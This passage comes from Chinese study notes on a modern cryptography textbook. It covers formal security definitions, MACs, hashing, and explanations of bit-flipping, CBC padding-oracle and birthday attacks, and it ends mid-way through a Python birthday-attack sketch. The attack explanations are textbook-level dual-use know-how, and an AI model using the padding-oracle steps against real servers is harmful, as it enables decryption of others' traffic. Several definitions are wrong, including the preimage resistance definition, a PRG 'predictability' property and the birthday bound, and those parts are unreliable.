id="论渐近安全的定义选择"><a href="#论渐近安全的定义选择" class="headerlink" title="论渐近安全的定义选择"></a>论渐近安全的定义选择</h4><p><strong>两个选择：</strong></p><ul><li>将有效的对抗策略与概率多项式时间算法相对应，</li><li>将小的成功概率等同于可忽略的概率</li></ul><h4 id="宽松的必要性"><a href="#宽松的必要性" class="headerlink" title="宽松的必要性"></a>宽松的必要性</h4><p><strong>完美安全的限制：</strong> 密钥空间|K|必须和密文空间|M|一样大，不现实。</p><h2 id="3-2-定义计算安全加密"><a href="#3-2-定义计算安全加密" class="headerlink" title="3.2 定义计算安全加密"></a>3.2 定义计算安全加密</h2><p>针对私钥加密的计算安全性定义</p><h3 id="3-2-1-基本安全定义（EAV安全）"><a href="#3-2-1-基本安全定义（EAV安全）" class="headerlink" title="3.2.1 基本安全定义（EAV安全）"></a>3.2.1 基本安全定义（EAV安全）</h3><blockquote><p>EAV安全：即Eavesdropper Attack Security，攻击者仅观察单个密文，核心在于不可区分性。</p></blockquote><p>针对仅密文攻击的安全性，即对手只观察到密文，或者给定密钥只能加密单个消息。</p><ul><li>定义动机<br><strong>威胁模型</strong>：定义攻击者的假设能力，只能观察到单个密文,并在多项式时间内运行。<br><strong>安全目标</strong>：定义什么情况下加密方案被认为是被“破解”的，安全目标是攻击者无法从密文中获取任何关于明文的部分信息</li></ul><blockquote><p>这里的<strong>安全目标</strong>只是一个思想，这个思想概念的明确化在后边的语义安全定义给出，但由于语义安全较为复杂且难以处理，这里介绍一个与语义安全等价的定义——不可区分性。</p></blockquote><ul><li>窃听者存在下的不可区分性<br>定义：一个私钥加密方案$Π$是“在窃听者存在的情况下不可区分的”，如果对于所有概率多项式时间攻击者A，存在一个可忽略函数$negl$，使得对于所有安全参数n：<br>$Pr[PrivKeav_{A,Π}​(n)&#x3D;1]≤\frac 12​+negl(n)$<br>等效表述：<br>$∣Pr[out_A​(PrivKeav_{A,Π}​(n,0))&#x3D;1]−Pr[out_A​(PrivKeav_{A,Π}​(n,1))&#x3D;1]∣≤negl(n)$</li></ul><h4 id="揭示明文长度"><a href="#揭示明文长度" class="headerlink" title="揭示明文长度"></a>揭示明文长度</h4><p><strong>默认</strong>的安全加密定义中，不要求加密方案隐藏明文长度，但几乎所有常用的加密方案都会泄露明文长度（或其近似值）<br><strong>明文长度泄露可能导致的问题：</strong></p><ul><li><strong>简单数字&#x2F;文本数据：</strong> 对于敏感信息可能会造成泄露，如个人收入位数不同也就可能暴露收入水平</li><li><strong>自动补全功能：</strong> 这个自动补全列表大小可能揭示用户迄今为止输入的字母</li><li><strong>数据库搜索：</strong> 返回的记录数量可能会泄露用户搜索的内容</li><li><strong>压缩数据：</strong> 较短的压缩明文可能表明原始明文存在大量冗余</li></ul><h3 id="3-2-2-语义安全"><a href="#3-2-2-语义安全" class="headerlink" title="3.2.2 语义安全"></a>3.2.2 语义安全</h3><p><strong>语义安全性</strong>：语义安全性是第一个被提出的计算安全加密定义，它正式概念化了“攻击者无法从密文中获取任何关于明文的部分信息”这一概念。</p><p>通常，一个加密算法被认为是语义安全的，当且仅当它满足选择明文攻击（chosen-plaintext attack，CPA）的安全性。</p><blockquote><p>区分一下不同难度的攻击，从上到下难度递减：</p><ul><li><strong>唯密文攻击（COA）：</strong> <ul><li>条件：已知一个或多个密文</li><li>目标：确定明文</li></ul></li><li><strong>已知明文攻击（KPA）：</strong><ul><li>条件：已知一个或多个相同密钥加密的明-密文对</li><li>目标：确定其他密文对应的明文</li></ul></li><li><strong>选择明文攻击（CPA）：</strong><ul><li>条件：可以选择明文进行加密，并得到加密结果</li><li>目标：确定明文</li></ul></li><li><strong>选择密文攻击（CCA）：</strong><ul><li>条件：可以选择密文进行解密，并得到解密结果（通常不能对所要求的密文进行解密）</li><li>目标：确定所要求的密文对应的明文</li></ul></li></ul></blockquote><blockquote><p>下面再引出CPA安全和CCA安全的理解：</p><ul><li><strong>CPA安全：</strong> 针对加密方案而言，已知两个明文，对其中一个加密得到密文，攻击者无法很好地判断这个密文对应哪个明文。</li><li><strong>CCA安全：</strong> 针对加密方案而言，已知两个密文，对其中一个解密得到明文，攻击者无法很好地判断这个明文对应哪个密文。</li></ul></blockquote><ul><li><strong>语义安全</strong><br><strong>定义</strong>：一个私钥加密方案是语义安全的，如果对于任何ppt算法A，存在一个ppt算法$A_0$，使得对于任何ppt算法Samp和多项式时间可计算函数f和h，以下概率是可忽略的：<br>$Pr[A(1^n,Enck(m),h(m))&#x3D;f(m)]−Pr[A_0​(1^n,∣m∣,h(m))&#x3D;f(m)]$</li></ul><p><strong>语义安全的等价性：</strong><br>一个私钥加密方案在窃听者存在的情况下具有<strong>不可区分的加密</strong>当且仅当它是<strong>语义安全</strong>的。</p><blockquote><p><strong>语义安全</strong>与<strong>监听者存在下的不可区分性</strong>等价，但比不可区分性更为复杂和难以处理。</p></blockquote><h2 id="3-3-构建EAV安全加密方案"><a href="#3-3-构建EAV安全加密方案" class="headerlink" title="3.3 构建EAV安全加密方案"></a>3.3 构建EAV安全加密方案</h2><p>在构建EAV安全加密方案之前，先引入伪随机生成器，因为它通常用来生成加密密钥。</p><h3 id="3-3-1-伪随机生成器（PRG）"><a href="#3-3-1-伪随机生成器（PRG）" class="headerlink" title="3.3.1 伪随机生成器（PRG）"></a>3.3.1 伪随机生成器（PRG）</h3><p><strong>定义：</strong><br><strong>伪随机生成器</strong>是一个高效、确定性的算法，将一个较短的均匀随机字符串（seed）转换为更长的“看起来均匀”的字符串（伪随机字符串）</p><p>一个好的PRG应满足的条件：</p><ul><li>均匀性：输出的比特串应该足够均匀地分布在所有可能地比特串中</li><li>可预测性：在有seed的情况下可预测</li><li>不可区分性：在多项式时间内不能区分PRG输出和真正随机的输出</li></ul><blockquote><p>伪随机生成器G的输出并不是真正的均匀字符串</p></blockquote><p><strong>种子及长度：</strong><br>seed就类似加密方案中的密钥，必须<strong>均匀</strong>且必须<strong>足够长</strong>防止暴力攻击，还需要进行保密<br><strong>关于伪随机数的存在：</strong><br>虽然我们无法无条件地证明伪随机生成器的存在，但有理由相信它们存在。例如，如果单向函数存在，则可以构造伪随机生成器。<br><strong>实际构造</strong>：有许多实际的伪随机生成器（如流密码）被广泛使用，目前尚未发现有效的区分器。</p><h3 id="3-3-2-规约证明"><a href="#3-3-2-规约证明" class="headerlink" title="3.3.2 规约证明"></a>3.3.2 规约证明</h3><p>通常情况下，证明某个密码构造$Π$是安全的，只需要某个基础问题$X$是困难的，我们需要通过提供一个显式的规约来证明，该规约说明如何将任何成功“破解”$Π$的有效攻击者$A$转化为一个有效算法$A’$，该算法$A’$可以解决$X$。</p><blockquote><p>个人理解：就是将一个方案的安全性建立在某个困难问题上。</p></blockquote><h3 id="3-3-3-伪随机数生成器的EAV安全"><a href="#3-3-3-伪随机数生成器的EAV安全" class="headerlink" title="3.3.3 伪随机数生成器的EAV安全"></a>3.3.3 伪随机数生成器的EAV安全</h3><h4 id="加密方案"><a href="#加密方案" class="headerlink" title="加密方案"></a><strong>加密方案</strong></h4><ul><li><strong>构造</strong>：使用PRG G，其扩展因子为$l(n)$，构造一个固定长度的私钥加密方案。</li><li><strong>关键生成</strong>：$Gen(1^n)$输出一个均匀随机的n位种子k。</li><li><strong>加密</strong>：$Enc(k, m)$使用PRG G将种子k扩展为$l(n)$位的伪随机字符串，然后与明文m进行XOR得到密文c。</li><li><strong>解密</strong>：$Dec(k, c)$使用PRG G将种子k扩展为$l(n)$位的伪随机字符串，然后与密文c进行XOR得到明文m。</li></ul><h4 id="规约-讨论"><a href="#规约-讨论" class="headerlink" title="规约-讨论"></a><strong>规约-讨论</strong></h4><p><strong>目标</strong>：证明如果G是一个PRG，那么上述构造的加密方案是EAV-secure的。<br><strong>证明思路</strong>：通过归约证明，将攻击者A的成功概率与PRG G的伪随机性联系起来。</p><ul><li><strong>步骤1</strong>：固定一个攻击者A，其成功概率为$ε(n)$。</li><li><strong>步骤2</strong>：构造一个区分器D，它使用A来区分PRG G的输出和均匀随机字符串。</li><li><strong>步骤3</strong>：分析D的行为，证明如果G是PRG，那么D无法以非可忽略的概率区分G的输出和均匀随机字符串。</li><li><strong>步骤4</strong>：得出结论，A无法以非可忽略的概率成功攻击加密方案。</li></ul><h4 id="具体安全性"><a href="#具体安全性" class="headerlink" title="具体安全性"></a><strong>具体安全性</strong></h4><p>如果G是$(t, ε)-PRG$，那么加密方案是$(t - t_0, ε)-secure$，其中$t_0$是一个小的常数。<br>如果攻击者A在时间$t - t_0$内运行，那么D在时间$t$内运行。由于G是$(t, ε)-PRG$，D无法以超过$ε$的概率区分G的输出和均匀随机字符串，因此A无法以超过$ε$的概率成功攻击加密方案。</p><h2 id="3-4-更强的安全概念"><a href="#3-4-更强的安全概念" class="headerlink" title="3.4 更强的安全概念"></a>3.4 更强的安全概念</h2><h3 id="3-4-1-多次加密的安全性"><a href="#3-4-1-多次加密的安全性" class="headerlink" title="3.4.1 多次加密的安全性"></a>3.4.1 多次加密的安全性</h3><p>前面EAV安全只考虑了单个密文的安全性。<br><strong>多次加密安全定义：</strong><br><strong>实验定义</strong>：引入了一个新的实验$PrivK^{mult}_{A,Π}(n)$，用于评估加密方案在多消息场景下的安全性。</p><ol><li><strong>攻击者输出消息列表</strong>：攻击者A输出两组等长的消息列表$\vec M_0$和$\vec M_1$，每组包含t个消息，且每对消息$(m_0,i, m_1,i)$长度相同。</li><li><strong>密钥生成和加密</strong>：生成一个密钥k，随机选择一个比特b，对每组消息列表中的消息进行加密，得到密文列表$\vec C$。 </li><li><strong>攻击者猜测</strong>：攻击者A观察密文列表$\vec C$，并输出一个比特$b’$。</li><li><strong>实验结果</strong>：如果$b’ &#x3D; b$，则实验输出1，表示攻击者成功；否则输出0。</li></ol><h4 id="概率加密的必要性"><a href="#概率加密的必要性" class="headerlink" title="概率加密的必要性"></a><strong>概率加密的必要性</strong></h4><p>为了实现多次加密的安全性，加密方案必须引入随机性，使得即使加密相同的消息，也会产生不同的密文。</p><h4 id="流密码安全多次加密方案"><a href="#流密码安全多次加密方案" class="headerlink" title="流密码安全多次加密方案"></a>流密码安全多次加密方案</h4><p><strong>同步模式：</strong> 密钥流足够长，双方同步通讯，得知已使用过的密钥流的位数，去掉已使用过的位数，往后截取新的密钥进行使用<br><strong>非同步模式：</strong> 设置一个初始向量$IV$，生成密钥流时添入不同$IV$，保证每次生成的结果不一样。</p><h3 id="3-4-2-选择明文攻击和CPA安全性"><a href="#3-4-2-选择明文攻击和CPA安全性" class="headerlink" title="3.4.2 选择明文攻击和CPA安全性"></a>3.4.2 选择明文攻击和CPA安全性</h3><p><strong>定义</strong>：选择明文攻击是指攻击者能够选择某些明文，并观察这些明文被加密后的密文。这种攻击模拟了攻击者对加密过程的部分控制能力。</p><h4 id="CPA安全性"><a href="#CPA安全性" class="headerlink" title="CPA安全性"></a><strong>CPA安全性</strong></h4><p><strong>现代加密的最低要求</strong>：CPA安全性是现代加密方案应满足的最低安全要求。它确保即使攻击者能够选择某些明文并观察其密文，也无法获取关于其他未知消息的任何信息。<br><strong>更强的安全性</strong>：虽然CPA安全性是最低要求，但实际应用中通常需要更强的安全性。</p><h3 id="3-4-3-CPA安全性和多消息加密"><a href="#3-4-3-CPA安全性和多消息加密" class="headerlink" title="3.4.3 CPA安全性和多消息加密"></a>3.4.3 CPA安全性和多消息加密</h3><p><strong>等价性</strong>：如果一个加密方案能够抵抗单次加密的选择明文攻击，那么它也能够抵抗多消息加密的选择明文攻击</p><ul><li><strong>固定长度vs任意长度消息</strong><br><strong>构造方法：</strong> 将任意长度的消息拆分为各个固定长度的消息分别加密</li></ul><h2 id="3-5-构建一个CPA安全的加密方案"><a href="#3-5-构建一个CPA安全的加密方案" class="headerlink" title="3.5 构建一个CPA安全的加密方案"></a>3.5 构建一个CPA安全的加密方案</h2><h3 id="3-5-1-伪随机函数（PRFs）和置换"><a href="#3-5-1-伪随机函数（PRFs）和置换" class="headerlink" title="3.5.1 伪随机函数（PRFs）和置换"></a>3.5.1 伪随机函数（PRFs）和置换</h3><p>PRFs：伪随机函数是一种“看起来随机”的函数。与伪随机生成器类似，伪随机函数的安全性是通过其输出与真正随机函数的输出难以区分来定义的</p><ul><li><strong>伪随机函数和伪随机发生器</strong><br><strong>从PRF构造PRG</strong>：可以通过在一系列不同输入上评估PRF来构造PRG。例如，定义$G(s) &#x3D; F_s(1) || F_s(2) || … || F_s(l)$，其中$l$是所需的输出长度。<br><strong>从PRG构造PRF</strong>：可以将PRG的输出解释为一个查找表，从而构造一个PRF。但这种方法仅适用于小输入长度。</li></ul><blockquote><p>PRG要求输出长度必须大于输入长度，但PRF允许输出长度与输入无关</p></blockquote><h4 id="伪随机置换"><a href="#伪随机置换" class="headerlink" title="伪随机置换"></a>伪随机置换</h4><p><strong>定义：</strong> 伪随机置换是一种特殊的PRF，其中输入和输出长度相同，并且对于每个密钥k，$F_k$是一个双射（即置换）。</p><ul><li><strong>强伪随机置换</strong><br><strong>定义：</strong> 强伪随机置换不仅要求$F_k$与均匀随机置换不可区分，还要求即使区分器D同时访问$F_k$和其逆函数$F_k^{-1}$，也无法区分。</li></ul><h3 id="3-5-2-基于伪随机函数的CPA安全"><a href="#3-5-2-基于伪随机函数的CPA安全" class="headerlink" title="3.5.2 基于伪随机函数的CPA安全"></a>3.5.2 基于伪随机函数的CPA安全</h3><p>需要引入一个随机变量$r(如上边流密码非同步模式中的IV)$</p><h1 id="4-消息认证码（MAC）"><a href="#4-消息认证码（MAC）" class="headerlink" title="4.消息认证码（MAC）"></a>4.消息认证码（MAC）</h1><p>保证真实性和完整性</p><h2 id="4-1-消息完整性"><a href="#4-1-消息完整性" class="headerlink" title="4.1 消息完整性"></a>4.1 消息完整性</h2><h3 id="4-1-1-安全性vs完整性"><a href="#4-1-1-安全性vs完整性" class="headerlink" title="4.1.1 安全性vs完整性"></a>4.1.1 安全性vs完整性</h3><p><strong>保密性与完整性的区别</strong></p><ul><li><strong>保密性</strong>：通过加密技术防止被动窃听者获取通信内容。其目标是确保消息的内容不被未经授权的人知晓。</li><li><strong>完整性</strong>：确保消息在传输过程中未被篡改或伪造。这不仅涉及消息内容的正确性，还涉及消息来源的真实性</li></ul><h3 id="4-1-2-加密与消息认证"><a href="#4-1-2-加密与消息认证" class="headerlink" title="4.1.2 加密与消息认证"></a>4.1.2 加密与消息认证</h3><p> <strong>加密与消息认证的区别</strong> </p><ul><li><strong>加密</strong>：用于实现保密性，即防止未经授权的第三方获取消息内容。   </li><li><strong>消息认证</strong>：用于保证消息的完整性和来源的真实性，确保消息未被篡改且确实来自声称的发送者。</li></ul><p><strong>常见误区</strong>：许多人错误地认为加密可以自动提供消息认证，但实际上加密并不保证消息的完整性，除非它被专门设计为具有此功能。</p><ul><li><p><strong>使用流密码加密</strong><br><strong>流密码加密机制</strong>：使用共享密钥生成伪随机序列（pad），然后通过与明文进行异或运算生成密文。<br><strong>漏洞分析</strong>：流密码加密的密文很容易被篡改。攻击者可以通过翻转密文中的任意一位来翻转解密后明文中的对应位。例如：<br>如果用户加密了一个表示转账金额的数字（如1000美元），攻击者可以通过翻转最低位来改变金额为1001美元，或者通过翻转第11位来增加超过1000美元。<br>即使攻击者不知道具体的金额，但如果有部分先验知识（如金额小于1000美元），他们可以预测修改的效果。<br><strong>结论</strong>：这种攻击并不违反加密的保密性，但它严重破坏了消息的完整性。</p></li><li><p><strong>使用分组密码加密</strong><br><strong>分组密码加密机制</strong>：使用分组密码（如AES）对数据块进行加密。<br><strong>漏洞分析</strong>：<br><strong>ECB模式</strong>：翻转密文中某个数据块的某一位只会改变解密后该数据块的对应位，其他数据块保持不变。虽然对单个数据块的影响可能难以预测，但这种局部篡改可能已经足够造成损害。此外，攻击者可以通过重新排列密文块来重新排列明文块，或者通过丢弃密文块来截断消息。<br><strong>CBC模式</strong>：攻击者可以通过翻转$IV$的某一位来改变第一个明文块的对应位，而其他明文块保持不变。<br><strong>结论</strong>：即使使用更复杂的分组密码加密模式，攻击者仍然可以通过对密文进行局部修改来实现对明文的篡改。</p></li></ul><h2 id="4-2-MAC定义"><a href="#4-2-MAC定义" class="headerlink" title="4.2 MAC定义"></a>4.2 MAC定义</h2><p>MAC的目的是防止对手修改一方发送给另一方的消息，或注入新消息，而接收方无法察觉消息并非来自预期的发送方</p><p><strong>MAC的两个典型应用场景</strong></p><ul><li>确保两方通信时的完整性（如用户与银行之间的通信）</li><li>或一个用户随时间“与自己”通信（如涉及网络Cookie的情况，或用户保护其硬盘内容的情况）</li></ul><h4 id="消息认证码的语法"><a href="#消息认证码的语法" class="headerlink" title="消息认证码的语法"></a>消息认证码的语法</h4><p><strong>密钥生成算法 Gen</strong>：输入安全参数$1^n$，输出密钥 k，且$∣k∣≥n$。<br><strong>标签生成算法 Mac</strong>：输入密钥 k 和消息 m，输出标签 t。<br><strong>验证算法 Vrfy</strong>：输入密钥 k、消息 m 和标签 t，输出验证结果（1 表示有效，0 表示无效）。</p><p><strong>要求</strong>：对于所有密钥 k 和消息 m，必须满足$Vrfy_k​(m,Mack​(m))&#x3D;1$。</p><ul><li><strong>规范验证</strong><br>对于确定性的MAC，进行验证的规范方法：<br>重新计算标签并检查其是否相等。换句话说，$Vrfy_k（m，t）$首先计算$\bar t：&#x3D;Mack(m)$，然后输出1当且仅当$\tilde t&#x3D;t$。</li></ul><h4 id="MAC安全"><a href="#MAC安全" class="headerlink" title="MAC安全"></a>MAC安全</h4><p><strong>两个定义假设：</strong></p><ol><li>攻击者可以反复请求其选择的任何消息的标签。</li><li>如果攻击者能够为任何之前未认证的消息生成有效标签，则认为方案被破解。</li></ol><p>如果无法被上述方式破解，那么MAC被称为在自适应选择消息攻击下存在性不可伪造的。</p><ul><li><p><strong>定义是否过于严格？</strong><br>有人提议说定义安全性时只关注<strong>有效消息</strong>就可以，但在实际中，是否有效取决于具体情况，只有严格的定义才能适应更广泛的情况。</p></li><li><p><strong>重播攻击</strong><br>攻击者简单地重新发送之前已认证的消息及其有效标签。MAC本身无法防止这种攻击，因为验证过程是无状态的（即每次呈现有效的消息和标签对时，验证算法总是输出1）。<br>防止方法：序列号、时间戳</p></li><li><p><strong>强不可伪造性</strong><br>要求攻击者无法为任何消息生成新的有效标签，即使该消息之前已被认证过。</p></li><li><p><strong>验证查询</strong><br>这些定义中的攻击者被赋予对MAC预言机的访问权限，这对应于现实世界中能够影响诚实发送方为某些消息生成标签的攻击者。</p></li><li><p><strong>潜在的定时攻击</strong><br>一种测信道攻击：它需要访问验证预言机以及测量比较i和i+ 1字节所需时间差异的能力。</p></li></ul><h1 id="5-选择密文攻击-CCA-安全和认证加密"><a href="#5-选择密文攻击-CCA-安全和认证加密" class="headerlink" title="5.选择密文攻击(CCA)安全和认证加密"></a>5.选择密文攻击(CCA)安全和认证加密</h1><p><strong>概念</strong>：攻击者选择密文让接收者解密。<br><strong>简单举例</strong>：战争中，美军曾向日军透露包含AF的加密信息，通过日军的反应，可以猜测AF所代表的明文是什么。</p><p>攻击常发生在Web服务器上，用来获取TLS会话内容</p><h2 id="5-2Padding-Oracle-Attacks（填充提示攻击）"><a href="#5-2Padding-Oracle-Attacks（填充提示攻击）" class="headerlink" title="5.2Padding-Oracle Attacks（填充提示攻击）"></a>5.2Padding-Oracle Attacks（填充提示攻击）</h2><ul><li><strong>常用填充方式PKCS #7</strong>:<br>设分组密码的分组长度为L，若密文差b个字节达到L的整数倍，那么便填充b个值为b的十六进制数<br>如：差4个字节就填充0x04040404<br>如果b等于0，那么便令b为L，即$b\in [1,L]$<br><strong>验证方法：</strong> 先读取最后一个字节的值b，再判断最后b个值是否都为b。</li></ul><h3 id="攻击方法：-CBC模式"><a href="#攻击方法：-CBC模式" class="headerlink" title="攻击方法：(CBC模式)"></a><strong>攻击方法：(CBC模式)</strong></h3><p>已知：$IV,c_1,c_2$<br><strong>1.求b：</strong><br>先修改最后一个块的第一个字节，如果报错，说明b&#x3D;L,，否则b&lt;L，接着修改下一个字节，重复此过程便能求出b。<br><strong>2.求除填充外的最后一个明文字节：</strong> </p><ul><li>设$i\in[0,2^8),$取一个<br>$\Delta i$<br>$&#x3D;0x00,…,0x00,0xi, 0x(b+1),…,0x(b+1)$<br>$\oplus,0x00,…,0x00,0x00,0xb,…,0xb$<blockquote><p>ps:$0xi$后跟的是b个0xb+1</p></blockquote></li><li>取$c_1’&#x3D;c_1\oplus \Delta i$，将$IV,c_1’,c_2$送给解密服务器</li><li>遍历$i$，知道服务器返回解密成功，此时的$m_2$明文形式为：<br>$m_2&#x3D;…;0x(b+1);0x(b+1);…;0x(b+1)$，共$b+1$个$0x(b+1)$</li><li>设最后一个明文非填充字节为M，则有$0x(b+1)&#x3D;M\oplus i$</li><li>得到$M&#x3D;i\oplus 0x(b+1)$</li><li>以此类推便可以求出所有明文字节，据我理解，求$m_1$时可以去掉$c_2$，将b最开始当作0，将$c_1,IV$发送给解密服务器。</li></ul><h3 id="验证码攻击"><a href="#验证码攻击" class="headerlink" title="验证码攻击"></a>验证码攻击</h3><ul><li>Web服务器$S_w$（生成密文），验证码服务器$S_c$（生成验证码），两服务器共享密钥，用户$u$<br><strong>正常过程：</strong> $S_w$生成密文发送给用户$u，u$将其发送给$S_c$，$S_c$会对填充错误的密文返回错误，让$S_c$生成扭曲的验证码返回$u，u$通过查看验证码得到明文$m$，发送给$Sw$，验证通过<br><strong>攻击过程：</strong> $S_w$行为不变，$u$使用Padding Oracle Attacks去攻击$S_c$，最后得到明文$m$，此时自动脚本也能完成人机验证。</li></ul><h3 id="CCA安全性定义"><a href="#CCA安全性定义" class="headerlink" title="CCA安全性定义"></a>CCA安全性定义</h3><p><strong>威胁模型：</strong></p><ul><li>拥有加密预言机（黑盒，密钥随机），解密预言机，但对给定密文没有解密权限。（一般是最坏假设）<br><strong>安全目标：</strong></li><li>给定攻击者一个密文$c$，若他能以显著大于$\frac12$的概率判断是$m_0,m_1$中的哪个的加密结果，则方案不安全。</li></ul><h2 id="5-2认证加密（AE）"><a href="#5-2认证加密（AE）" class="headerlink" title="5.2认证加密（AE）"></a>5.2认证加密（AE）</h2><p><strong>目标：</strong> 保密性，完整性<br>保密性：CCA安全<br>完整性：不可伪造性<br><strong>定义</strong>：如果一个私钥加密方案既是CCA安全的，又是不可伪造的，则它是一个认证加密（AE）方案。</p><h1 id="6-哈希函数和应用"><a href="#6-哈希函数和应用" class="headerlink" title="6.哈希函数和应用"></a>6.哈希函数和应用</h1><p><strong>概念：</strong> 一种将长输入字符串映射到短输出字符串（摘要）的函数。<br><strong>碰撞：</strong> 两个不同输入产生相同摘要。<br><strong>抗碰撞性：</strong> 任何概率多项式时间算法都难以找到H中的碰撞。<br><strong>带密钥的hash函数：</strong> 此时函数H有两个输入，$key:s,string:x$，输出为$H^s&#x3D;H(s,x)$。其中$s$在上标是为了说明，$s$不是保密的，即使对手获得了$s$，函数H仍然具有抗碰撞性。</p><blockquote><p>实际应用中基本上还是使用不带密钥的hash函数。</p></blockquote><p><strong>第二原像抗碰撞性：</strong> 已知H和x，ppt对手难以找到$x_1\neq x$，使$H^s(x_1)&#x3D;H^s(x)$</p><blockquote><p>抗碰撞性的hash函数也是抗第二原像碰撞的，抗第二原像碰撞的也是抗原像碰撞的。</p></blockquote><p><strong>原像抗性：</strong> 已知H和y（y&#x3D;H(x)），ppt对手能找到一个$x_1$（无论是否等于x）使得$H^s(x_1)&#x3D;y$。</p><blockquote><p>原像抗性基本上意味着$H^s$的单向性。</p></blockquote><h2 id="6-2The-Merkle-Damgard-Transform"><a href="#6-2The-Merkle-Damgard-Transform" class="headerlink" title="6.2The Merkle-Damgard Transform"></a>6.2The Merkle-Damgard Transform</h2><p><strong>简要：</strong> $Merkle-Damgard$变换，即MD变换，是一种将定长哈希函数转换成全功能（可变长度）哈希函数的技术。<br><strong>定长哈希</strong>：MD5、SHA-256等。<br><img src="/2025/04/28/Introduction%20To%20Modern%20Cryptography%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/file-20250422161507480.png"><br><strong>变换步骤</strong>：</p><ul><li>将数据分割成多个固定大小的块，每个块大小通常等于定长哈希函数的长度</li><li>设置$IV$</li><li>对每个块进行压缩。（使用定长hash函数将前一个压缩结果和当前块进行压缩）</li><li>最后得到的最后一个压缩输出便是该全功能hash函数的输出</li></ul><h2 id="6-3-Hash-and-MAC和HMAC"><a href="#6-3-Hash-and-MAC和HMAC" class="headerlink" title="6.3 Hash-and-MAC和HMAC"></a>6.3 Hash-and-MAC和HMAC</h2><h3 id="6-3-1-Hash-and-MAC"><a href="#6-3-1-Hash-and-MAC" class="headerlink" title="6.3.1 Hash-and-MAC"></a>6.3.1 Hash-and-MAC</h3><p><strong>实现：</strong> 首先使用Hash函数对消息进行摘要，然后使用密钥对哈希值进行签名，得到MAC</p><p><strong>特点：</strong></p><ul><li>简单高效</li><li>安全可靠<br><strong>限制：</strong></li><li>密钥管理</li><li>单向性</li></ul><h3 id="6-3-2-HMAC"><a href="#6-3-2-HMAC" class="headerlink" title="6.3.2 HMAC"></a>6.3.2 HMAC</h3><p>使用hash运算的消息认证码MAC<br><strong>构造：</strong></p><ul><li>对密钥进行预处理，使其与哈希函数的输入长度相同（通常是哈希函数的块长度）。</li><li>将经过预处理的密钥与消息进行异或运算，得到新的输入。</li><li>对新的输入使用哈希函数进行多轮迭代计算，得到消息认证码。</li></ul><p><strong>优点：</strong></p><ul><li>安全性高</li><li>灵活性强</li></ul><h3 id="6-4-1-生日攻击"><a href="#6-4-1-生日攻击" class="headerlink" title="6.4.1 生日攻击"></a>6.4.1 生日攻击</h3><p><strong>介绍：</strong> 在一个大小为N的输出空间中，遍历$\Theta(\sqrt N)$时找到碰撞的概率为$\frac12$左右。</p><blockquote><p>若$N&#x3D;2^l$，则$\Theta(\sqrt N)&#x3D;\Theta(2^{\frac12})$</p></blockquote><h4 id="有意义碰撞："><a href="#有意义碰撞：" class="headerlink" title="有意义碰撞："></a><strong>有意义碰撞：</strong></h4><p>条件同上，遍历两组$\Theta(2^{\frac12})$的不同消息。<br>两组消息存在碰撞的概率也为$\frac12$左右。</p><h3 id="6-4-2-小空间生日攻击"><a href="#6-4-2-小空间生日攻击" class="headerlink" title="6.4.2 小空间生日攻击"></a>6.4.2 小空间生日攻击</h3><p>使用Floyd循环查找算法，使成功概率和运行时间与原版大致相同，但只需常数内存。</p><blockquote><p>如果练过算法题，应该会知道<strong>快慢指针法</strong>，其实本质是一样的，慢指针做一次运算，慢指针做两次运算，如果有循环，总会相遇。</p></blockquote><p><strong>步骤：</strong> </p><ul><li>首先选择一个随机的消息$x_0$，赋值$x:&#x3D;x_0,x’:&#x3D;x_0$</li><li>在第$i$次迭代时比较$x_i&#x3D;H(x_{i-1})和x_i’&#x3D;H(H(x_{i-1}’))$的值</li><li>如果$x_i &#x3D; x_i’$，说明发生了冲突。</li><li>（直接碰撞）且如果$x_{i-1}\neq H(x_{i-1}’)$，则冲突对为$x_{i-1}\neq H(x_{i-1}’)$</li><li>（间接碰撞）而如果$x_{i-1} &#x3D; H(x_{i-1}’)$，则说明碰撞可能发生在更早的步骤中。但由于hash值没有被记录，因此还需要再次迭代</li><li>存储找到的编号$i$，并将$x&#x3D;x_0,x’&#x3D;x_0$，重置初始值为$x_0$</li><li>迭代到$i$,在每一步$j$中，检查$H(x_j)&#x3D;H(x_j’)$</li><li>若找到，则找到了碰撞，返回$x_j$和$x_j’$</li><li>否则，令$x_j&#x3D;H(x_j)$和$x_j’&#x3D;H(x_j’)$<br><strong>代码实现:</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">random_binary_string</span>(<span class="hljs-params">length = <span class="hljs-number">16</span></span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(<span class="hljs-string">&#x27;01&#x27;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">H</span>(<span class="hljs-params">x</span>):<br><span class="hljs-keyword">return</span> hashlib.sha256(x.encode()).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SmallSpaceBirthdayAttack</span>():<br>x_0 = random_binary_string()<br>x = x_0<br>x_1 = x_0<br>i = <span class="hljs-number">0</span><br><br><span class="hljs-comment">#寻找碰撞</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>x = H(x)<br>x_1 = H(H(x_1))<br><br><span class="hljs-keyword">if</span> x == x_1:<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>i += <span class="hljs-number">1</span><br><br><span 